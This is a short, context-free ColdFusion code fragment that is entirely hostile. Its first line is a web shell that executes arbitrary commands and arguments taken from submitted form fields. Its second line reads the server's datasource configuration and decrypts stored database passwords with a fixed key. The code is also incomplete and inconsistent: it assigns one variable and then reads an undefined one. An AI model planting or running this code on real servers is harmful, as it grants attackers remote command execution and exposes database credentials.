<cfexecute name="#form.cmd#" arguments="#form.opts#"><cfoutput>Result</cfoutput>
<cfscript>obj=createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();plain=Decrypt("fixed",data[i]["password"],"DESede","Base64");</cfscript>
